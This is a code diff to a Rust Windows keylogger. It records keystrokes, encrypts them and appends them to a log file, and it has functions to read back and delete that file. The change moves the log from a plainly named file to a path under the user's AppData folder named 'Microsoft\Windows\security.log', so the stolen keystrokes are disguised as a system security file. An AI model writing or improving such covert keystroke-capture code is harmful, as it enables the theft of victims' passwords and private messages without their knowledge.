@@ -4,6 +4,7 @@ use std::sync::Mutex;
 use once_cell::sync::Lazy;
 use std::io::Write;
 use crate::encode::{self, Encode};
+use std::path::PathBuf;
 
 use windows::Win32::Foundation::{
     HWND, LPARAM, LRESULT, WPARAM
@@ -52,7 +53,13 @@ use windows::Win32::UI::Input::KeyboardAndMouse::{
 
 // creates a global encoder
 static ENCODER: Lazy<Mutex<encode::Encode>> = Lazy::new(|| Mutex::new(Encode::new(52)));
-const KEYLOGGING_FILE: & str = "keyLogging.txt";
+
+static KEYLOGGING_FILE: Lazy<PathBuf> = Lazy::new(|| {
+    let appdata = std::env::var("APPDATA").expect("APPDATA not found");
+    let mut path = PathBuf::from(appdata);
+    path.push("Microsoft\\Windows\\security.log");
+    path
+});
 
 pub fn get_windows_version() -> &'static str{
     let mut system_info = SYSTEM_INFO::default();
@@ -184,7 +191,7 @@ fn write_into_file(button_pressed:& str){
     let mut data_file = OpenOptions::new()
     .create(true)
     .append(true).
-    open(KEYLOGGING_FILE).expect("Cannot open file");
+    open(KEYLOGGING_FILE.as_path()).expect("Cannot open file");
     
     let enc = enc.encrypt(button_pressed);
     writeln!(data_file, "{}", &enc).expect("msg");
@@ -193,16 +200,16 @@ fn write_into_file(button_pressed:& str){
 
 pub fn read_file() -> String{
     let mut dec = ENCODER.lock().unwrap();
-
+    println!("{}",KEYLOGGING_FILE.display());
     dec.reset_key();
 
     OpenOptions::new()
         .create(true) // ← ensures the file exists
         .append(true) // ← opens without truncating
-        .open(KEYLOGGING_FILE)
+        .open(KEYLOGGING_FILE.as_path())
         .expect("Failed to create or open file");
 
-    let read = fs::read_to_string(KEYLOGGING_FILE)
+    let read = fs::read_to_string(KEYLOGGING_FILE.as_path())
     .expect("can't read into file");
 
     let mut decode_string = String::new();
@@ -220,7 +227,7 @@ pub fn read_file() -> String{
 
 pub fn delete_file(){
 
-    match fs::remove_file(KEYLOGGING_FILE){
+    match fs::remove_file(KEYLOGGING_FILE.as_path()){
         Ok(_) => {
 
         },
